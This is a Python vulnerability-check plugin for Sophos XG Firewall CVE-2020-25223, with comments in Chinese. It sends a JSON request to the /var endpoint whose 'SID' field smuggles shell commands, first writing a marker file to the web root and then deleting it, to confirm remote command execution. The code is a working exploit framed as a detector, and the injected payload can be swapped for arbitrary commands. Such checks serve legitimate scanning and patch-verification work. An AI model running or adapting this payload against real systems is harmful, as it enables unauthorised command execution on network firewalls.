import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SophosVuln:
    name = "Sophos XG Firewall CVE-2020-25223"
    description = "Sophos XG Firewall 远程命令执行漏洞检测 (CVE-2020-25223)"
    author = "Security Researcher"
    group = "Firewall"  # 自定义分组
    
    def check(self, target):
        """
        检测Sophos XG Firewall是否存在CVE-2020-25223漏洞
        :param target: 目标URL (如 https://example.com:4444)
        :return: 检测结果字符串
        """
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
            
        result = ""
        url_var = target.rstrip("/") + "/var"
        
        try:
            # 提取host头部所需的值
            if target.startswith("https://"):
                host = target[8:]
            else:
                host = target[7:]
            
            headers = {
                "Host": host.split("/")[0],
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json; charset=UTF-8"
            }
            
            # 测试payload
            test_payload = {
                "SID": "|echo 'vuln_test' > /var/sec/chroot-httpd/var/webadmin/test.txt|",
                "current_uuid": ""
            }
            
            # 清理payload
            clean_payload = {
                "SID": "|rm /var/sec/chroot-httpd/var/webadmin/test.txt|",
                "current_uuid": ""
            }
            
            # 发送测试请求
            requests.post(url_var, headers=headers, json=test_payload, verify=False, timeout=10)
            
            # 检查测试文件
            test_file = requests.get(target.rstrip("/") + "/test.txt", headers=headers, verify=False, timeout=5)
            
            if "vuln_test" in test_file.text:
                result = f"[{self.name}] 目标 {target}：存在CVE-2020-25223漏洞（高危）"
            else:
                result = f"[{self.name}] 目标 {target}：未发现CVE-2020-25223漏洞"
            
            # 清理测试文件
            requests.post(url_var, headers=headers, json=clean_payload, verify=False, timeout=5)
            
        except requests.exceptions.Timeout:
            result = f"[{self.name}] 目标 {target}：检测超时"
        except requests.exceptions.ConnectionError:
            result = f"[{self.name}] 目标 {target}：连接失败"
        except Exception as e:
            result = f"[{self.name}] 目标 {target}：检测异常 - {str(e)}"
        
        return result